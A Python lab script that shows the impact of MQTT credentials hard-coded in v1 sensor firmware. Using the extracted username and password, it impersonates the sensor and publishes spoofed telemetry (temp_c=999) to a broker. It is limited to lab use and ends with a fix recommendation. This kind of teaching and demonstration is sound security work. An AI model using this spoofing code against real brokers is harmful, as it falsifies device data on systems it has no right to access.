#!/usr/bin/env python3
"""
attack-mqtt.py — demonstrate the impact of credentials extracted from v1 firmware.

The v1 image bakes its MQTT username/password straight into the binary, so REA
pulls them out of .rodata trivially. This script proves why that matters: with
those creds, anything on the network can impersonate the sensor and publish
whatever telemetry it likes.

It connects to a broker YOU run and publishes a few obviously-fake readings
(temp_c = 999) to the sensor's topic. On your dashboard you'll see the spoofed
values land next to the genuine feed. That's the whole lesson.

SCOPE / SAFETY
    Use this only against a broker you own and operate for this lab (e.g. a local
    Mosquitto). It publishes harmless test data and nothing else. Do not point it
    at a broker you do not control.

Usage:
    python3 attack-mqtt.py --host 192.168.1.50 --port 1883 \
        --user sensor01 --password sensor-lab-pass \
        --topic lab/sensor01/telemetry [--count 5] [--interval 1.0]

Requires:  pip install paho-mqtt
"""
import argparse
import json
import sys
import time

try:
    import paho.mqtt.client as mqtt
except ImportError:
    sys.exit("paho-mqtt not installed. Run:  pip install paho-mqtt")


def main() -> int:
    ap = argparse.ArgumentParser(description="Publish spoofed telemetry to your own lab broker.")
    ap.add_argument("--host", required=True, help="broker host/IP you control")
    ap.add_argument("--port", type=int, default=1883, help="broker port (default 1883)")
    ap.add_argument("--user", required=True, help="MQTT username extracted from v1 firmware")
    ap.add_argument("--password", required=True, help="MQTT password extracted from v1 firmware")
    ap.add_argument("--topic", required=True, help="sensor telemetry topic")
    ap.add_argument("--count", type=int, default=5, help="how many spoofed messages to send")
    ap.add_argument("--interval", type=float, default=1.0, help="seconds between messages")
    args = ap.parse_args()

    print(f">> Demonstrating credential reuse against YOUR broker {args.host}:{args.port}")
    print(f">> If this works, the creds baked into the firmware were never secret.\n")

    # paho-mqtt 2.x requires an explicit callback API version; 1.x doesn't have it.
    if hasattr(mqtt, "CallbackAPIVersion"):
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="spoofed-sensor01")
    else:
        client = mqtt.Client(client_id="spoofed-sensor01")
    client.username_pw_set(args.user, args.password)

    try:
        client.connect(args.host, args.port, keepalive=30)
    except Exception as e:
        print(f"!! could not connect: {e}")
        print("   (expected, if this is your HARDENED setup where plaintext 1883 is closed)")
        return 1

    client.loop_start()
    for i in range(args.count):
        payload = json.dumps({
            "id": "sensor01",
            "temp_c": 999.0,          # obviously bogus, so it's unmistakable on the dashboard
            "spoofed": True,
            "note": "published by attack-mqtt.py using extracted credentials",
        })
        info = client.publish(args.topic, payload, qos=0)
        info.wait_for_publish()
        print(f"   [{i+1}/{args.count}] published spoofed reading -> {args.topic}")
        time.sleep(args.interval)

    client.loop_stop()
    client.disconnect()

    print("\n>> Done. Check your dashboard: the temp_c=999 readings are the proof.")
    print(">> Fix: move creds to encrypted NVS + flash encryption, and use TLS (v2).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
